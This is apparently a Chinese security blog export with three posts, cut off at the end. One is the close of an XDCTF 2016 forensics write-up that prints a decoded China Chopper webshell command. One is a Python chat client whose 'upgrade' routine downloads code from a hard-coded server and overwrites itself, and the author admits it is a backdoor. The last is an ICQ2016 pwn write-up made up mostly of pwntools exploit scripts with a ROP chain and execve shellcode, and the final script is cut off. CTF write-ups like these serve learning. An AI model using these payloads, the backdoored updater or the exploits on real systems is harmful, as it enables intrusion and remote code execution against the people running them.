<img src="/2016/10/05/xdctf2016-wp/login.png" alt="login.png" title="">
<p>发现黑客进入后台后，修改的页面为index.html，题三解决</p>
<img src="/2016/10/05/xdctf2016-wp/file.png" alt="file.png" title="">
<p>如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为<code>chopper</code>，完整连接地址为<code>http://118.194.196.232/index.php?m=search</code>,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。</p>
<img src="/2016/10/05/xdctf2016-wp/muma.png" alt="muma.png" title="">
<p>继续往下分析。发现其查看了目录文件，继而返回去分析其命令。</p>
<img src="/2016/10/05/xdctf2016-wp/muma2.png" alt="muma2.png" title="">
<p><code>chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D</code></p>
<p>url解码</p>
<p><code>chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8=</code></p>
<p>z0为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(Ii0 |&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</div><div class="line">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();</div></pre></td></tr></table></figure></p>
<p>z1为<br><code>/var/www/html/</code></p>
<p>可知其查看的第一个文件目录为<code>/var/www/html</code>，第六个问题解决。</p>
<p>发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。</p>
<p>如下图，大量对<code>http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111</code>的<code>Domain</code>参数进行sql注入尝试的http数据包。然而并没有什么软用<br><img src="/2016/10/05/xdctf2016-wp/sqlmap.png" alt="sqlmap.png" title=""></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C/S-WeChat]]></title>
      <url>/2016/07/19/C-S-WeChat/</url>
      <content type="html"><![CDATA[<h3 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h3><p>某日战队的一个小伙伴提出来，可以制作一个基于socket的聊天室出来，用来应对比赛时的交流问题（嗯。。不是有微信和QQ么。。），不过想法很不错。<br>我也借着这次机会复习一下python的socket网络编程。</p>
<p>这些项目保存在我的github上，并且看我心情更新。</p>
<p>未解决问题：</p>
<ol>
<li>数据明文传输，未加密。</li>
<li>未设置登录限制，可以匿名随意进入聊天室。</li>
<li>易被DDOS</li>
<li><p>未发现的问题</p>
<a id="more"></a>
<h3 id="client模块"><a href="#client模块" class="headerlink" title="client模块"></a>client模块</h3></li>
<li><p>首先检测是否有更新，若有更新则下载最新的更新。</p>
</li>
<li>异步接收远程服务器传递过来的数据，一旦接收到数据则puts到界面。</li>
<li>接收用户输入的数据，当用户输入回车后将数据发送到远程服务器上</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">@version: ??</div><div class="line">@author: WinterSun</div><div class="line">@contact: 511683586@qq.com</div><div class="line">@site: http://blog.csdn.net/yuanyunfeng3</div><div class="line">@software: PyCharm</div><div class="line">@file: client.py</div><div class="line">@time: 2016/7/8 0:43</div><div class="line">"""</div><div class="line"></div><div class="line"><span class="keyword">import</span> socket,threading,select</div><div class="line"><span class="keyword">import</span> hashlib,sys,os</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">()</span>:</span></div><div class="line">    filepath =  sys.path[<span class="number">0</span>]+os.sep+sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        local_hash = hashlib.md5(f.read()).hexdigest()</div><div class="line">    addr = (<span class="string">'123.207.98.208'</span>,<span class="number">55557</span>)</div><div class="line">    s = socket.socket()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        s.connect(addr)</div><div class="line">        s.send(local_hash)</div><div class="line">        inputs=  [s]</div><div class="line">        rs,ws,es = select.select(inputs,[],[],<span class="number">1</span>)</div><div class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> rs:</div><div class="line">            data = r.recv(<span class="number">1024</span>)</div><div class="line">            <span class="keyword">if</span> data  == <span class="string">'1'</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">"this is the lastest version!"</span></div><div class="line">                inputs.remove(r)</div><div class="line">                r.close()</div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                s.send(<span class="string">'get file_size'</span>)</div><div class="line">                size = s.recv(<span class="number">1024</span>)</div><div class="line">                s.send(<span class="string">"get file"</span>)</div><div class="line">                new_file = s.recv(int(size))</div><div class="line">                <span class="keyword">with</span> open(filepath,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(new_file)</div><div class="line">                <span class="keyword">print</span> <span class="string">"the client is upgraded,plz restart it!"</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">except</span> Exception,e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line">        <span class="keyword">print</span> <span class="string">"can't connect update_sever"</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(s)</span>:</span></div><div class="line">    inputs=  [s]</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        rs,ws,es = select.select(inputs,[],[],<span class="number">1</span>)</div><div class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> rs:</div><div class="line">            <span class="keyword">print</span> r.recv(<span class="number">1024</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            info = raw_input()</div><div class="line">        <span class="keyword">except</span> Exception,e:</div><div class="line">            <span class="keyword">print</span> e</div><div class="line">            exit(<span class="number">0</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            s.send(info)</div><div class="line">        <span class="keyword">except</span> Exception,e:</div><div class="line">            <span class="keyword">print</span> e</div><div class="line">            exit()</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> upgrade():</div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    host = raw_input(<span class="string">"plz input sever [ip:port] :"</span>)</div><div class="line">    host,port = host.split(<span class="string">':'</span>)</div><div class="line">    addr = (host,int(port))</div><div class="line">    s = socket.socket()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        s.connect(addr)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"can't connect this sever!"</span></div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    name = raw_input(<span class="string">"plz input your name:"</span>)</div><div class="line">    s.send(name)</div><div class="line">    t1 = threading.Thread(target=read,args=(s,))</div><div class="line">    t2 = threading.Thread(target=write,args=(s,))</div><div class="line"></div><div class="line">    t1.start()</div><div class="line">    t2.start()</div></pre></td></tr></table></figure>
<h3 id="server模块"><a href="#server模块" class="headerlink" title="server模块"></a>server模块</h3><p>请设置port，默认为10087</p>
<ol>
<li>不断接收新的套接字。</li>
<li>当有新的套接字进入时，将欢迎信息发送过去。</li>
<li>第一次输入为用户名。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*-coding=utf8-*-</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">@version: ??</div><div class="line">@author: WinterSun</div><div class="line">@contact: 511683586@qq.com</div><div class="line">@site: http://blog.csdn.net/yuanyunfeng3</div><div class="line">@software: PyCharm</div><div class="line">@file: sever.py</div><div class="line">@time: 2016/7/8 0:08</div><div class="line">"""</div><div class="line"></div><div class="line"><span class="keyword">import</span> socket,select</div><div class="line"></div><div class="line">host=<span class="string">'0.0.0.0'</span></div><div class="line">prot=<span class="number">10087</span></div><div class="line">s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.bind((host,prot))</div><div class="line">s.listen(<span class="number">5</span>)</div><div class="line">inputs = [s]</div><div class="line">namedic = &#123;&#125;</div><div class="line">namelist = []</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(data,inputs)</span>:</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> inputs:</div><div class="line">        <span class="keyword">if</span> x != s:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                x.send(data)</div><div class="line">            <span class="keyword">except</span> Exception,e:</div><div class="line">                <span class="keyword">print</span> e</div><div class="line">                <span class="keyword">if</span> x <span class="keyword">in</span> inputs:</div><div class="line">                    inputs.remove(x)</div><div class="line">                    x.close()</div><div class="line">                send(namedic[x]+<span class="string">"\tleaving!\n"</span>,inputs)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        rs,ws,es = select.select(inputs,[],[],<span class="number">1</span>)</div><div class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> rs:</div><div class="line">            <span class="keyword">if</span> r <span class="keyword">is</span> s:</div><div class="line">                conn,addr = r.accept()</div><div class="line">                <span class="keyword">print</span> <span class="string">'Connect by'</span>,addr</div><div class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        name = conn.recv(<span class="number">1024</span>)</div><div class="line">                        <span class="keyword">if</span> len(name) &gt; <span class="number">30</span>:</div><div class="line">                            conn.send(<span class="string">"your name is toooooo long!\n"</span>)</div><div class="line">                            <span class="keyword">continue</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            namedic[conn] = name</div><div class="line">                            namelist.append(name)</div><div class="line">                            inputs.append(conn)</div><div class="line">                            data = <span class="string">"Welcome "</span>+name</div><div class="line">                            send(data,inputs)</div><div class="line">                            <span class="keyword">break</span></div><div class="line">                    <span class="keyword">except</span> socket.error:</div><div class="line">                        <span class="keyword">pass</span></div><div class="line"></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    data = r.recv(<span class="number">1024</span>)</div><div class="line">                    <span class="keyword">print</span> namedic[r]+<span class="string">":"</span>+data</div><div class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">                        data =  <span class="string">"\tleaving!\n"</span></div><div class="line">                        <span class="keyword">print</span> namedic[r]+data</div><div class="line">                        <span class="keyword">if</span> r <span class="keyword">in</span> inputs:</div><div class="line">                            inputs.remove(r)</div><div class="line">                            r.close()</div><div class="line">                        send(namedic[r]+data,inputs)</div><div class="line">                    <span class="keyword">else</span>:</div><div class="line">                        send(namedic[r]+<span class="string">":"</span>+data,inputs)</div><div class="line">                <span class="keyword">except</span> :</div><div class="line">                    data =  <span class="string">"\tleaving!\n"</span></div><div class="line">                    <span class="keyword">print</span> namedic[r]+data</div><div class="line">                    <span class="keyword">if</span> r <span class="keyword">in</span> inputs:</div><div class="line">                        inputs.remove(r)</div><div class="line">                        r.close()</div><div class="line">                    send(namedic[r]+data,inputs)</div></pre></td></tr></table></figure>
<h3 id="upgrade模块"><a href="#upgrade模块" class="headerlink" title="upgrade模块"></a>upgrade模块</h3><p>为了方便软件更新，特加入upgrade模块用于更新。（讲道理，这个其实是后门）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">import</span> hashlib,socket,select</div><div class="line">host=<span class="string">'0.0.0.0'</span></div><div class="line">prot=<span class="number">55557</span></div><div class="line">s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.bind((host,prot))</div><div class="line">s.listen(<span class="number">5</span>)</div><div class="line">inputs = [s]</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	rs,ws,es = select.select(inputs,[],[],<span class="number">1</span>)</div><div class="line">	<span class="keyword">for</span> r <span class="keyword">in</span> rs:</div><div class="line">		<span class="keyword">if</span> r <span class="keyword">is</span> s:</div><div class="line">			conn,addr = r.accept()</div><div class="line">			<span class="keyword">print</span> <span class="string">'Connect by'</span>,addr</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				local_hash = conn.recv(<span class="number">1024</span>)</div><div class="line">				<span class="keyword">with</span> open(<span class="string">'client.py'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">					lastest_hash = hashlib.md5(f.read()).hexdigest()</div><div class="line">				<span class="keyword">if</span> local_hash == lastest_hash:</div><div class="line">					conn.send(<span class="string">'1'</span>)</div><div class="line">					conn.close()</div><div class="line">				<span class="keyword">else</span>:</div><div class="line">					conn.send(<span class="string">'0'</span>)</div><div class="line">					inputs.append(conn)</div><div class="line">			<span class="keyword">except</span>:</div><div class="line">				<span class="keyword">pass</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				data = r.recv(<span class="number">1024</span>)</div><div class="line">				<span class="keyword">with</span> open(<span class="string">'client.py'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">					file = f.read()</div><div class="line">				<span class="keyword">if</span> data ==<span class="string">"get file_size"</span>:</div><div class="line">					<span class="keyword">print</span> <span class="string">"send file_size"</span></div><div class="line">					<span class="comment"># print len(file),type(len(file))</span></div><div class="line">					r.sendall(str(len(file)))</div><div class="line">				<span class="keyword">if</span> data ==<span class="string">"get file"</span>:</div><div class="line">					<span class="keyword">print</span> <span class="string">"send file"</span></div><div class="line">					r.sendall(file)</div><div class="line">			<span class="keyword">except</span>:</div><div class="line">				<span class="keyword">pass</span></div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> code </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[杂记-2016-7-18]]></title>
      <url>/2016/07/18/%E6%9D%82%E8%AE%B0-2016-7-18/</url>
      <content type="html"><![CDATA[<h3 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h3><p>这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。</p>
 <a id="more"></a>
<h3 id="ICQ2016-WP"><a href="#ICQ2016-WP" class="headerlink" title="ICQ2016-WP"></a>ICQ2016-WP</h3><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn1")</span></div><div class="line">p  = remote(<span class="string">"106.75.37.29"</span>,<span class="number">10000</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn1"</span>)</div><div class="line">scanf_plt = elf.symbols[<span class="string">"__isoc99_scanf"</span>]</div><div class="line">system_plt = elf.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"><span class="comment"># system_got</span></div><div class="line"><span class="comment">#0x0804857E</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(off,value)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">	p.sendline(str(off))</div><div class="line">	p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">	p.sendline(str(value))</div><div class="line"></div><div class="line">	p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">	p.sendline(str(<span class="number">0x28</span><span class="number">-0xc</span>))</div><div class="line">	p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">	p.sendline(<span class="string">"0"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(off,l)</span>:</span></div><div class="line">	i = <span class="number">0</span> </div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> l:</div><div class="line">		p1 = x &amp; <span class="number">0xff</span></div><div class="line">		p2 = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></div><div class="line">		p3 = (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></div><div class="line">		p4 = (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p1)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p2)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p3)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p4)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">	<span class="keyword">return</span> i</div><div class="line">l = [scanf_plt,<span class="number">0x080486ae</span>,<span class="number">0x080486ED</span>,<span class="number">0x804A028</span>,scanf_plt,<span class="number">0x080486ae</span>,<span class="number">0x080486ED</span>,<span class="number">0x804A02c</span>,system_plt,<span class="number">0x080486ae</span>,<span class="number">0x804A028</span>]</div><div class="line"><span class="comment">#system_plt,0x080486ae,0x804A028</span></div><div class="line"></div><div class="line">index = change(<span class="number">60</span>,l)</div><div class="line">p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">p.sendline(str(<span class="number">0x28</span><span class="number">-0xc</span>))</div><div class="line">p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">p.sendline(<span class="string">"10"</span>)</div><div class="line">p.recvuntil(<span class="string">"Your Array:0 0 0 0 0 0 0 0 0 0 "</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0804857E\nc")</span></div><div class="line">p.sendline(str(u32(<span class="string">"/bin"</span>)))</div><div class="line">p.sendline(str(u32(<span class="string">"/sh\0"</span>)))</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;9587c60c6962efc66d5adc7d18ee5500&#125;</span></div></pre></td></tr></table></figure>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>卡了一段时间，挺好玩的,exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn2")</span></div><div class="line">p = remote(<span class="string">"106.75.37.31"</span>,<span class="number">23333</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"ight!\n\n"</span>)</div><div class="line"></div><div class="line">op_add_mv = chr((<span class="number">0xD70</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_exit = chr((<span class="number">0xD40</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_sub = chr((<span class="number">0xB28</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_mov_l = chr((<span class="number">0xD20</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">23</span>):</div><div class="line">	p.sendline(op_sub)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x2f</span>+<span class="number">2</span>):</div><div class="line">	p.sendline(op_add_mv)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">	p.sendline(op_sub)</div><div class="line"></div><div class="line">shellcode = <span class="string">"\x90"</span>*<span class="number">60</span>+<span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></div><div class="line"></div><div class="line">p.sendline(str(<span class="number">0x602080</span>+<span class="number">40</span>))</div><div class="line">p.sendline(str(<span class="number">0x602080</span>+<span class="number">40</span>))</div><div class="line">p.sendline(shellcode)</div><div class="line">p.sendline(op_mov_l)</div><div class="line">p.sendline(op_add_mv)</div><div class="line"></div><div class="line"><span class="comment"># 